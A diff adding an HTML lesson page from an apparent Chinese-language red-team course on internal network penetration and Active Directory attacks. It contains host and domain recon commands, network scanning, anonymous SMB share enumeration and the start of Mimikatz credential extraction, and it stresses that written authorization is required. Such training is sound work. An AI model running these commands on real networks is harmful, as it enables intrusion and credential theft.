@@ -1,0 +1,1395 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Stage 07 — 內網滲透 | SEC_TRACK</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#07080f;--bg2:#0b0c14;--bg3:#101118;--sur:#191a25;--bdr:#232534;
+  --acc:#b06dff;--acc2:#8b48d8;--txt:#e2dff5;--txt2:#8c8aa8;--txt3:#464460;
+  --red:#f05252;--grn:#3ecf8e;--cyn:#22d3ee;--ylw:#fbbf24;--org:#f97316;--rose:#fb7185;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Noto Sans TC',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;}
+body::before{content:'';position:fixed;inset:0;background:
+  radial-gradient(ellipse 55% 35% at 10% 0%,rgba(176,109,255,.05) 0%,transparent 55%),
+  radial-gradient(ellipse 45% 30% at 90% 100%,rgba(139,72,216,.04) 0%,transparent 55%);
+  pointer-events:none;z-index:0;}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 36px;background:rgba(7,8,15,.95);backdrop-filter:blur(14px);border-bottom:1px solid var(--bdr);}
+.n-logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:.95rem;color:var(--acc);text-decoration:none;}
+.n-logo span{color:var(--txt3);}
+.n-mid{display:flex;align-items:center;gap:10px;}
+.s-pill{font-family:'JetBrains Mono',monospace;font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:3px 10px;border-radius:20px;background:rgba(176,109,255,.1);color:var(--acc);border:1px solid rgba(176,109,255,.28);}
+.n-sname{font-size:.8rem;color:var(--txt2);}
+.n-back{font-size:.8rem;color:var(--txt3);text-decoration:none;transition:color .2s;}
+.n-back:hover{color:var(--acc);}
+.layout{display:grid;grid-template-columns:280px 1fr;min-height:100vh;padding-top:60px;}
+.sidebar{position:sticky;top:60px;height:calc(100vh - 60px);overflow-y:auto;background:var(--bg2);border-right:1px solid var(--bdr);display:flex;flex-direction:column;z-index:10;}
+.sidebar::-webkit-scrollbar{width:3px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--bdr);}
+.sb-h{padding:22px 22px 16px;border-bottom:1px solid var(--bdr);flex-shrink:0;}
+.sb-tag{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--acc);letter-spacing:.14em;text-transform:uppercase;margin-bottom:6px;}
+.sb-title{font-size:.88rem;font-weight:700;line-height:1.45;margin-bottom:13px;}
+.sb-meta{display:flex;gap:16px;}
+.sm-item{display:flex;flex-direction:column;gap:2px;}
+.sm-val{font-family:'JetBrains Mono',monospace;font-size:.82rem;font-weight:700;color:var(--acc);}
+.sm-key{font-size:.62rem;color:var(--txt3);letter-spacing:.06em;text-transform:uppercase;}
+.sb-nav{flex:1;overflow-y:auto;padding:6px 0;}
+.ch-btn{width:100%;display:flex;align-items:center;gap:9px;padding:9px 22px;background:none;border:none;border-bottom:1px solid rgba(35,37,52,.7);color:var(--txt2);font-family:'Noto Sans TC',sans-serif;font-size:.79rem;font-weight:500;cursor:pointer;text-align:left;transition:color .18s,background .18s;}
+.ch-btn:hover{color:var(--txt);background:var(--bg3);}
+.ch-btn.cact{color:var(--acc);}
+.ch-num{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);min-width:26px;flex-shrink:0;}
+.ch-btn.cact .ch-num{color:var(--acc);}
+.ch-arr{font-size:.52rem;color:var(--txt3);transition:transform .2s;flex-shrink:0;}
+.ch-btn.copen .ch-arr{transform:rotate(90deg);}
+.ls-list{display:none;flex-direction:column;background:rgba(0,0,0,.15);}
+.ls-list.lopen{display:flex;}
+.ls-btn{display:flex;align-items:flex-start;gap:9px;padding:7px 22px 7px 44px;background:none;border:none;border-bottom:1px solid rgba(35,37,52,.4);color:var(--txt3);font-family:'Noto Sans TC',sans-serif;font-size:.74rem;cursor:pointer;text-align:left;width:100%;transition:color .18s,background .18s;line-height:1.4;}
+.ls-btn:hover{color:var(--txt2);background:rgba(176,109,255,.03);}
+.ls-btn.lact{color:var(--acc);background:rgba(176,109,255,.06);}
+.ls-btn.ldone{color:var(--txt3);}
+.ls-dot{width:5px;height:5px;border-radius:50%;background:var(--bdr);flex-shrink:0;margin-top:5px;transition:background .2s;}
+.ls-btn.lact .ls-dot{background:var(--acc);}
+.ls-btn.ldone .ls-dot{background:var(--acc);}
+.sb-f{padding:13px 22px;border-top:1px solid var(--bdr);flex-shrink:0;}
+.pr{display:flex;justify-content:space-between;font-size:.68rem;color:var(--txt3);margin-bottom:6px;}
+.pt{height:3px;background:var(--bdr);border-radius:2px;overflow:hidden;}
+.pf{height:100%;background:var(--acc);border-radius:2px;transition:width .4s;}
+.main{position:relative;z-index:1;display:flex;flex-direction:column;}
+.lh{padding:38px 56px 30px;border-bottom:1px solid var(--bdr);background:linear-gradient(180deg,rgba(176,109,255,.03) 0%,transparent 100%);}
+.lh-crumb{font-family:'JetBrains Mono',monospace;font-size:.63rem;color:var(--txt3);letter-spacing:.08em;margin-bottom:11px;}
+.lh-crumb em{color:var(--acc);font-style:normal;}
+.lh-title{font-size:1.6rem;font-weight:800;letter-spacing:-.02em;line-height:1.2;margin-bottom:11px;}
+.lh-chips{display:flex;gap:8px;flex-wrap:wrap;}
+.chip{padding:3px 11px;border-radius:20px;font-size:.67rem;font-family:'JetBrains Mono',monospace;letter-spacing:.04em;border:1px solid var(--bdr);color:var(--txt3);}
+.chip.ac{border-color:rgba(176,109,255,.4);color:var(--acc);}
+.cw{padding:38px 56px 80px;max-width:880px;}
+.cb{display:none;}
+.cb.on{display:block;animation:rise .25s ease both;}
+@keyframes rise{from{opacity:0;transform:translateY(7px);}to{opacity:1;transform:none;}}
+h2{font-size:1.25rem;font-weight:800;letter-spacing:-.01em;margin:36px 0 13px;color:var(--txt);display:flex;align-items:center;gap:10px;}
+h2::before{content:'';display:inline-block;width:3px;height:1.1em;border-radius:2px;background:var(--acc);flex-shrink:0;}
+h2:first-child{margin-top:0;}
+h3{font-size:.98rem;font-weight:700;margin:22px 0 9px;color:var(--txt);}
+p{font-size:.9rem;line-height:1.85;color:var(--txt2);margin-bottom:11px;font-weight:300;}
+strong{color:var(--txt);font-weight:600;}
+code{font-family:'JetBrains Mono',monospace;font-size:.8em;background:var(--sur);border:1px solid var(--bdr);padding:1px 6px;border-radius:3px;color:var(--acc);}
+.note{border-left:3px solid;padding:13px 17px;margin:18px 0;border-radius:0 4px 4px 0;}
+.note-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:.12em;text-transform:uppercase;font-weight:700;margin-bottom:6px;}
+.note p{margin:0;font-size:.86rem;line-height:1.7;}
+.note.tip{border-color:var(--acc);background:rgba(176,109,255,.06);}
+.note.tip .note-lbl{color:var(--acc);}
+.note.warn{border-color:var(--ylw);background:rgba(251,191,36,.06);}
+.note.warn .note-lbl{color:var(--ylw);}
+.note.sec{border-color:var(--grn);background:rgba(62,207,142,.06);}
+.note.sec .note-lbl{color:var(--grn);}
+.note.danger{border-color:var(--red);background:rgba(240,82,82,.07);}
+.note.danger .note-lbl{color:var(--red);}
+.note.law{border-color:var(--pur,#a78bfa);background:rgba(167,139,250,.07);}
+.note.law .note-lbl{color:var(--pur,#a78bfa);}
+.note.atk{border-color:var(--rose);background:rgba(251,113,133,.06);}
+.note.atk .note-lbl{color:var(--rose);}
+.cblock{background:#050508;border:1px solid var(--bdr);border-radius:6px;margin:16px 0;overflow:hidden;}
+.ctop{display:flex;align-items:center;justify-content:space-between;padding:7px 15px;background:rgba(16,17,24,.8);border-bottom:1px solid var(--bdr);}
+.clang{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);letter-spacing:.1em;text-transform:uppercase;}
+.ccopy{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);background:none;border:none;cursor:pointer;transition:color .2s;}
+.ccopy:hover{color:var(--acc);}
+pre{padding:16px 20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.75;color:#cac8e0;}
+pre .kw{color:#c792ea;}pre .fn{color:#82aaff;}pre .st{color:#c3e88d;}pre .cm{color:#363554;font-style:italic;}
+pre .nu{color:#f78c6c;}pre .tg{color:#f07178;}pre .at{color:#ffcb6b;}pre .vl{color:#c3e88d;}
+pre .sl{color:#89ddff;}pre .op{color:#89ddff;}pre .hl{background:rgba(176,109,255,.12);border-radius:2px;padding:0 2px;}
+.tbl{overflow-x:auto;margin:16px 0;}
+table.t{width:100%;border-collapse:collapse;font-size:.82rem;}
+table.t th{background:var(--sur);padding:9px 14px;text-align:left;font-size:.63rem;font-family:'JetBrains Mono',monospace;color:var(--txt3);letter-spacing:.08em;text-transform:uppercase;border:1px solid var(--bdr);}
+table.t td{padding:9px 14px;border:1px solid var(--bdr);color:var(--txt2);font-weight:300;vertical-align:top;line-height:1.55;}
+table.t tr:hover td{background:var(--bg3);}
+.mc{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--acc);}
+.kg{display:grid;grid-template-columns:repeat(2,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin:16px 0;}
+.kt{background:var(--bg2);padding:14px 17px;}
+.kt-n{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--acc);font-weight:700;margin-bottom:5px;}
+.kt-d{font-size:.79rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.ilist{display:flex;flex-direction:column;border:1px solid var(--bdr);border-radius:4px;overflow:hidden;margin:16px 0;}
+.il-item{display:flex;align-items:flex-start;gap:13px;padding:12px 17px;border-bottom:1px solid var(--bdr);transition:background .15s;}
+.il-item:last-child{border-bottom:none;}
+.il-item:hover{background:var(--bg3);}
+.il-num{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--acc);min-width:24px;flex-shrink:0;padding-top:2px;font-weight:700;}
+.il-txt{font-size:.85rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.il-txt strong{color:var(--txt);}
+.atkflow{display:flex;flex-direction:column;gap:3px;margin:18px 0;}
+.af-step{display:flex;align-items:flex-start;gap:13px;padding:13px 16px;background:var(--sur);border:1px solid var(--bdr);border-radius:4px;position:relative;}
+.af-step::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--bdr);border-radius:4px 0 0 4px;}
+.af-step.s1::before{background:var(--acc);}
+.af-step.s2::before{background:var(--cyn);}
+.af-step.s3::before{background:var(--ylw);}
+.af-step.s4::before{background:var(--org);}
+.af-step.s5::before{background:var(--red);}
+.af-step.s6::before{background:var(--grn);}
+.af-n{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);font-weight:700;min-width:44px;flex-shrink:0;padding-top:2px;letter-spacing:.04em;}
+.af-t{font-size:.82rem;font-weight:700;color:var(--txt);margin-bottom:4px;}
+.af-d{font-size:.78rem;color:var(--txt2);line-height:1.55;font-weight:300;}
+.quiz{background:var(--bg3);border:1px solid var(--bdr);border-radius:6px;padding:22px;margin:26px 0;}
+.q-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--ylw);letter-spacing:.12em;text-transform:uppercase;margin-bottom:10px;}
+.q-q{font-size:.9rem;font-weight:600;margin-bottom:13px;line-height:1.5;color:var(--txt);}
+.q-opts{display:flex;flex-direction:column;gap:6px;}
+.qo{display:flex;align-items:flex-start;gap:10px;padding:8px 13px;border:1px solid var(--bdr);border-radius:4px;cursor:pointer;font-size:.83rem;color:var(--txt2);transition:all .18s;line-height:1.5;}
+.qo:hover{border-color:var(--acc);color:var(--txt);}
+.qo.ok{border-color:var(--acc);background:rgba(176,109,255,.07);color:var(--acc);}
+.qo.bad{border-color:var(--red);background:rgba(240,82,82,.07);color:var(--red);}
+.qo-k{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);min-width:16px;padding-top:1px;flex-shrink:0;}
+.q-exp{display:none;margin-top:12px;padding:11px 14px;background:rgba(176,109,255,.05);border-left:2px solid var(--acc);border-radius:0 4px 4px 0;font-size:.82rem;color:var(--txt2);line-height:1.65;}
+.q-exp.on{display:block;}
+.done-banner{background:linear-gradient(135deg,rgba(176,109,255,.07),rgba(139,72,216,.05));border:1px solid rgba(176,109,255,.2);border-radius:6px;padding:28px;margin:34px 0 14px;text-align:center;}
+.done-banner h3{font-size:1.1rem;font-weight:800;color:var(--acc);margin-bottom:8px;}
+.done-banner p{font-size:.87rem;margin-bottom:20px;}
+.btn-row{display:flex;gap:11px;justify-content:center;flex-wrap:wrap;}
+.btn-p{display:inline-block;padding:10px 24px;background:var(--acc);color:var(--bg);text-decoration:none;font-weight:700;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-p:hover{background:#c080ff;transform:translateY(-1px);}
+.btn-g{display:inline-block;padding:10px 24px;border:1px solid var(--bdr);color:var(--txt2);text-decoration:none;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-g:hover{border-color:var(--acc);color:var(--acc);}
+.lnav{display:flex;justify-content:space-between;align-items:center;padding:22px 56px;border-top:1px solid var(--bdr);background:var(--bg2);position:sticky;bottom:0;z-index:5;}
+.lb{display:flex;align-items:center;gap:7px;padding:8px 18px;border:1px solid var(--bdr);border-radius:4px;background:none;color:var(--txt2);font-size:.82rem;cursor:pointer;font-family:'Noto Sans TC',sans-serif;transition:all .18s;}
+.lb:hover:not(:disabled){border-color:var(--acc);color:var(--acc);}
+.lb.pri{background:var(--acc);color:var(--bg);border-color:var(--acc);font-weight:700;}
+.lb.pri:hover:not(:disabled){background:#c080ff;}
+.lb:disabled{opacity:.2;cursor:not-allowed;}
+.ln-mid{text-align:center;}
+.ln-cnt{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);}
+.ln-sub{font-size:.75rem;color:var(--txt3);margin-top:3px;max-width:260px;}
+@media(max-width:900px){.layout{grid-template-columns:1fr;}.sidebar{position:static;height:auto;}.lh,.cw{padding-left:20px;padding-right:20px;}.lnav{padding:16px 20px;}.kg{grid-template-columns:1fr;}.ln-sub{display:none;}}
+</style>
+</head>
+<body>
+<nav>
+  <a href="index.html" class="n-logo">SEC<span>_</span>TRACK</a>
+  <div class="n-mid"><span class="s-pill">STAGE 07</span><span class="n-sname">內網滲透</span></div>
+  <a href="index.html" class="n-back">&#8592; 首頁</a>
+</nav>
+
+<div class="layout">
+<aside class="sidebar">
+  <div class="sb-h">
+    <div class="sb-tag">STAGE 07 · 1個月</div>
+    <div class="sb-title">內網滲透<br>Active Directory 攻防</div>
+    <div class="sb-meta">
+      <div class="sm-item"><span class="sm-val">6</span><span class="sm-key">章節</span></div>
+      <div class="sm-item"><span class="sm-val">24</span><span class="sm-key">課程</span></div>
+      <div class="sm-item"><span class="sm-val">1月</span><span class="sm-key">時長</span></div>
+    </div>
+  </div>
+  <div class="sb-nav">
+    <div><button class="ch-btn copen cact" onclick="toggleCh(this,'ch1')"><span class="ch-num">CH1</span><span class="ch-name">內網信息收集</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list lopen" id="ch1">
+      <button class="ls-btn lact" onclick="go('l1-1',this)"><span class="ls-dot"></span>內網滲透概論與攻擊鏈</button>
+      <button class="ls-btn" onclick="go('l1-2',this)"><span class="ls-dot"></span>主機信息收集：系統 / 用戶 / 網路</button>
+      <button class="ls-btn" onclick="go('l1-3',this)"><span class="ls-dot"></span>內網掃描：存活發現與端口掃描</button>
+      <button class="ls-btn" onclick="go('l1-4',this)"><span class="ls-dot"></span>憑證收集：Mimikatz 與記憶體傾倒</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch2')"><span class="ch-num">CH2</span><span class="ch-name">Active Directory 基礎</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch2">
+      <button class="ls-btn" onclick="go('l2-1',this)"><span class="ls-dot"></span>AD 架構：域 / 樹 / 森林 / 信任</button>
+      <button class="ls-btn" onclick="go('l2-2',this)"><span class="ls-dot"></span>Kerberos 認證協議深入解析</button>
+      <button class="ls-btn" onclick="go('l2-3',this)"><span class="ls-dot"></span>LDAP 查詢與 BloodHound 域枚舉</button>
+      <button class="ls-btn" onclick="go('l2-4',this)"><span class="ls-dot"></span>PowerView / ADExplorer 偵察</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch3')"><span class="ch-num">CH3</span><span class="ch-name">域攻擊技術</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch3">
+      <button class="ls-btn" onclick="go('l3-1',this)"><span class="ls-dot"></span>Kerberoasting：服務帳號 Hash 提取</button>
+      <button class="ls-btn" onclick="go('l3-2',this)"><span class="ls-dot"></span>AS-REP Roasting：無預認證攻擊</button>
+      <button class="ls-btn" onclick="go('l3-3',this)"><span class="ls-dot"></span>Pass-the-Hash / Pass-the-Ticket</button>
+      <button class="ls-btn" onclick="go('l3-4',this)"><span class="ls-dot"></span>Golden Ticket / Silver Ticket 偽造</button>
+      <button class="ls-btn" onclick="go('l3-5',this)"><span class="ls-dot"></span>DCSync：模擬域控拉取 Hash</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch4')"><span class="ch-num">CH4</span><span class="ch-name">橫向移動</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch4">
+      <button class="ls-btn" onclick="go('l4-1',this)"><span class="ls-dot"></span>WMI / WinRM 遠端執行</button>
+      <button class="ls-btn" onclick="go('l4-2',this)"><span class="ls-dot"></span>PsExec / SMBExec / SmbClient</button>
+      <button class="ls-btn" onclick="go('l4-3',this)"><span class="ls-dot"></span>RDP 橫向移動與 RDP 劫持</button>
+      <button class="ls-btn" onclick="go('l4-4',this)"><span class="ls-dot"></span>Token 竊取與 Impersonation</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch5')"><span class="ch-num">CH5</span><span class="ch-name">隧道穿透與 C2</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch5">
+      <button class="ls-btn" onclick="go('l5-1',this)"><span class="ls-dot"></span>流量隧道：SSH / Frp / Chisel</button>
+      <button class="ls-btn" onclick="go('l5-2',this)"><span class="ls-dot"></span>SOCKS5 代理鏈：proxychains</button>
+      <button class="ls-btn" onclick="go('l5-3',this)"><span class="ls-dot"></span>C2 框架：Cobalt Strike / Sliver</button>
+      <button class="ls-btn" onclick="go('l5-4',this)"><span class="ls-dot"></span>DNS / ICMP 隱蔽隧道</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch6')"><span class="ch-num">CH6</span><span class="ch-name">權限維持與清理</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch6">
+      <button class="ls-btn" onclick="go('l6-1',this)"><span class="ls-dot"></span>持久化技術：計劃任務 / 服務 / 登錄表</button>
+      <button class="ls-btn" onclick="go('l6-2',this)"><span class="ls-dot"></span>日誌清理與痕跡消除</button>
+      <button class="ls-btn" onclick="go('l6-3',this)"><span class="ls-dot"></span>OPSEC 操作安全原則</button>
+    </div></div>
+  </div>
+  <div class="sb-f">
+    <div class="pr"><span>學習進度</span><span id="pct">0%</span></div>
+    <div class="pt"><div class="pf" id="pf" style="width:0%"></div></div>
+  </div>
+</aside>
+
+<main class="main">
+  <div class="lh">
+    <div class="lh-crumb" id="crumb">STAGE 07 &gt; CH1 &gt; <em>課程 1</em></div>
+    <h1 class="lh-title" id="ltitle">內網滲透概論與攻擊鏈</h1>
+    <div class="lh-chips">
+      <span class="chip ac" id="chip1">方法論</span>
+      <span class="chip" id="chip2">25 分鐘</span>
+    </div>
+  </div>
+  <div class="cw">
+
+<!-- ===== CH1: 內網信息收集 ===== -->
+
+<!-- L1-1 概論 -->
+<div class="cb on" id="l1-1">
+<h2>內網滲透概論與攻擊鏈</h2>
+<p>內網滲透（Internal Network Penetration）是在已獲得初始立足點後，在目標組織內部網路中持續擴大權限和訪問範圍的過程。這是紅隊演練的核心技術，也是真實 APT 攻擊的主要手段。</p>
+
+<h3>內網攻擊鏈（Cyber Kill Chain 內網版）</h3>
+<div class="atkflow">
+  <div class="af-step s1"><span class="af-n">STEP 1</span><div><div class="af-t">獲取初始立足點（Initial Access）</div><div class="af-d">通過 Web 漏洞利用（Stage 4）、釣魚郵件（Phishing）、供應鏈攻擊、VPN/RDP 爆破等手段，在目標內網中獲得第一個受控主機。這一步決定了後續攻擊的起點。</div></div></div>
+  <div class="af-step s2"><span class="af-n">STEP 2</span><div><div class="af-t">本地偵察（Local Recon）</div><div class="af-d">在立足點主機上收集信息：操作系統版本、本地用戶和群組、網路配置（IP/路由/ARP）、已安裝軟件、運行中進程、共享資源、域成員身份。</div></div></div>
+  <div class="af-step s3"><span class="af-n">STEP 3</span><div><div class="af-t">本地提權（Local Privilege Escalation）</div><div class="af-d">從普通用戶提升到 SYSTEM / Administrator，獲得更高本地權限，為後續憑證提取和橫向移動做準備。常用：未修補漏洞、服務錯誤配置、SeImpersonatePrivilege。</div></div></div>
+  <div class="af-step s4"><span class="af-n">STEP 4</span><div><div class="af-t">憑證收集（Credential Harvesting）</div><div class="af-d">使用 Mimikatz 等工具從 LSASS 記憶體、NTDS.dit、SAM 資料庫中提取 NTLM Hash、Kerberos Ticket、明文密碼。憑證是內網移動的「萬能鑰匙」。</div></div></div>
+  <div class="af-step s5"><span class="af-n">STEP 5</span><div><div class="af-t">橫向移動（Lateral Movement）</div><div class="af-d">利用收集的憑證（Hash / Ticket）通過 WMI、WinRM、SMB、RDP 等協議，在內網其他主機上執行代碼，逐步擴大控制範圍，向高價值目標（域控 DC）推進。</div></div></div>
+  <div class="af-step s6"><span class="af-n">STEP 6</span><div><div class="af-t">域控接管（Domain Compromise）</div><div class="af-d">獲取域管理員權限（Domain Admin）或域控制器（DC）的 SYSTEM 權限。執行 DCSync 獲取所有域帳號 Hash，實現對整個域環境的完全控制。</div></div></div>
+</div>
+
+<h3>內網環境核心概念</h3>
+<div class="kg">
+  <div class="kt"><div class="kt-n">Active Directory（AD）</div><div class="kt-d">微軟的目錄服務，企業內網的核心基礎設施。管理用戶帳號、電腦帳號、群組策略、認證授權。90% 以上的企業內網使用 AD。理解 AD 是內網滲透的根本。</div></div>
+  <div class="kt"><div class="kt-n">域控制器（DC）</div><div class="kt-d">運行 AD DS（Directory Services）的 Windows Server，是整個域的「大腦」。存儲所有域帳號的憑證（NTDS.dit）、管理 Kerberos 認證、執行群組策略。控制 DC = 控制整個域。</div></div>
+  <div class="kt"><div class="kt-n">NTLM 認證</div><div class="kt-d">Windows 的本地認證協議（Challenge-Response 機制）。核心是 NTLM Hash（NT Hash），不需要明文密碼即可認證（Pass-the-Hash 攻擊的基礎）。</div></div>
+  <div class="kt"><div class="kt-n">Kerberos 認證</div><div class="kt-d">AD 環境中的標準認證協議。基於票證（Ticket）機制，TGT（票證授權票證）和 ST（服務票證）是攻擊目標。Kerberoasting、Golden Ticket 等攻擊均基於此。</div></div>
+</div>
+
+<div class="note law">
+  <div class="note-lbl">授權要求</div>
+  <p>內網滲透測試必須在<strong>明確的書面授權範圍內</strong>進行，且通常要求更嚴格的授權文件（如風險確認書、緊急聯繫機制）。Stage 7 的所有技術只能在以下環境練習：自建的 Active Directory 實驗室（推薦 GOAD、DetectionLab）、HackTheBox / TryHackMe 的 AD 靶機（Pro Lab: RastaLabs、Offshore）、已獲得書面授權的客戶環境。</p>
+</div>
+</div>
+
+<!-- L1-2 主機信息收集 -->
+<div class="cb" id="l1-2">
+<h2>主機信息收集：系統 / 用戶 / 網路</h2>
+<p>獲得初始立足點後的第一步是靜默地收集當前主機的信息，了解所在環境，判斷是否在域中，以及後續的攻擊方向。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Windows 主機信息收集命令</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">REM ─── 系統基本信息 ───</span>
+systeminfo                              <span class="cm">REM 系統版本、補丁列表、域成員身份</span>
+hostname                                <span class="cm">REM 主機名</span>
+whoami /all                             <span class="cm">REM 當前用戶、SID、群組、特殊權限</span>
+net user                                <span class="cm">REM 所有本地用戶</span>
+net localgroup administrators           <span class="cm">REM 本地管理員群組成員</span>
+wmic os get Caption,Version,BuildNumber <span class="cm">REM 詳細 OS 版本</span>
+
+<span class="cm">REM ─── 網路信息 ───</span>
+ipconfig /all                           <span class="cm">REM 所有網路介面（注意多網卡 = 網段邊界）</span>
+route print                             <span class="cm">REM 路由表（發現可達的其他網段）</span>
+arp -a                                  <span class="cm">REM ARP 表（已通訊過的主機）</span>
+netstat -ano                            <span class="cm">REM 所有連線和監聽端口</span>
+netstat -ano | findstr ESTABLISHED      <span class="cm">REM 活躍連線（找到其他主機）</span>
+net view                                <span class="cm">REM 域內可見的共享資源</span>
+
+<span class="cm">REM ─── 域相關信息 ───</span>
+net user /domain                        <span class="cm">REM 域用戶列表</span>
+net group /domain                       <span class="cm">REM 域群組列表</span>
+net group "Domain Admins" /domain       <span class="cm">REM 域管理員成員</span>
+net group "Domain Controllers" /domain  <span class="cm">REM 域控制器</span>
+nltest /dclist:corp.local               <span class="cm">REM 列出指定域的所有 DC</span>
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  <span class="cm">REM PowerShell</span>
+
+<span class="cm">REM ─── 進程和服務 ───</span>
+tasklist /svc                           <span class="cm">REM 所有進程（尋找 AV/EDR 進程）</span>
+sc query type= all state= all           <span class="cm">REM 所有服務狀態</span>
+wmic product get name,version           <span class="cm">REM 已安裝軟件（找可利用的軟件版本）</span>
+
+<span class="cm">REM ─── 判斷防禦措施 ───</span>
+sc query windefend                      <span class="cm">REM Windows Defender 狀態</span>
+netsh advfirewall show allprofiles      <span class="cm">REM 防火牆配置</span>
+Get-MpComputerStatus                    <span class="cm">REM PowerShell：Defender 詳細狀態</span></pre>
+</div>
+</div>
+
+<!-- L1-3 內網掃描 -->
+<div class="cb" id="l1-3">
+<h2>內網掃描：存活發現與端口掃描</h2>
+<p>在受控主機上對內網進行掃描，目的是找到其他存活主機、開放服務，以及可能的攻擊路徑。內網掃描需要比外網更謹慎，避免觸發 IDS/EDR 告警。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">內網掃描技術（有噪音→低噪音）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 1. 用 ARP 快速發現存活主機（二層廣播，不過路由器）───</span>
+<span class="cm"># Windows（PowerShell）</span>
+1..254 | ForEach-Object { Start-Process ping.exe -ArgumentList "-n 1 -w 100 192.168.1.$_" -NoNewWindow }
+arp -a   <span class="cm"># 掃描後查看 ARP 表</span>
+
+<span class="cm"># Linux</span>
+arp-scan -I eth0 192.168.1.0/24          <span class="cm"># 需要 root</span>
+nmap -sn 192.168.1.0/24                  <span class="cm"># Ping 掃描（不掃端口）</span>
+
+<span class="cm"># ─── 2. 端口掃描（從立足點主機執行）───</span>
+<span class="cm"># 用 nmap（如果已上傳到目標主機）</span>
+nmap -sT -p 80,443,445,3389,22 192.168.1.0/24 --open -oN scan.txt
+
+<span class="cm"># 用 PowerShell 輕量掃描（無需工具）</span>
+1..1024 | ForEach-Object {
+    $conn = New-Object System.Net.Sockets.TcpClient
+    $conn.BeginConnect("192.168.1.100", $_, $null, $null) | Out-Null
+    Start-Sleep -Milliseconds 50
+    if ($conn.Connected) { Write-Host "Open: $_" }
+    $conn.Close()
+}
+
+<span class="cm"># ─── 3. 重點端口含義（內網中最關鍵的）───</span>
+<span class="cm"># 445   → SMB（橫向移動 PsExec/WMI 的基礎）</span>
+<span class="cm"># 389   → LDAP（AD 查詢，BloodHound 枚舉域信息）</span>
+<span class="cm"># 88    → Kerberos（域認證，Kerberoasting 目標）</span>
+<span class="cm"># 5985  → WinRM HTTP（Evil-WinRM 遠端執行 Shell）</span>
+<span class="cm"># 3389  → RDP（桌面遠端控制）</span>
+<span class="cm"># 1433  → MSSQL（xp_cmdshell 可 RCE，可能包含敏感數據）</span>
+<span class="cm"># 5900  → VNC（遠端桌面，可能無密碼）</span>
+
+<span class="cm"># ─── 4. SMB 共享枚舉（找可訪問的共享）───</span>
+crackmapexec smb 192.168.1.0/24          <span class="cm"># 掃描所有 SMB 主機</span>
+crackmapexec smb 192.168.1.0/24 -u '' -p '' --shares  <span class="cm"># 匿名共享枚舉</span>
+smbclient -L //192.168.1.100 -N          <span class="cm"># 匿名列出共享</span>
+smbclient //192.168.1.100/C$ -U "domain\user%password"  <span class="cm"># 訪問 C$ 管理共享</span></pre>
+</div>
+</div>
+
+<!-- L1-4 憑證收集 -->
+<div class="cb" id="l1-4">
+<h2>憑證收集：Mimikatz 與記憶體傾倒</h2>
+<p>憑證收集是內網滲透中最關鍵的步驟。Windows 在記憶體中保存認證信息用於 SSO（單點登入），這使得 Mimikatz 等工具可以從 LSASS 進程中提取明文密碼和 Hash。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Mimikatz — 憑證提取命令</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">REM ─── Mimikatz 基本使用（需 SYSTEM / Administrator 權限）───</span>
+<span class="cm">REM 以管理員身份執行 mimikatz.exe</span>
+
+<span class="cm">REM 提升到 Debug 特權（訪問 LSASS 進程所需）</span>
+mimikatz # privilege::debug
+
+<span class="cm">REM ─── 從 LSASS 記憶體提取憑證（核心操作！）───</span>
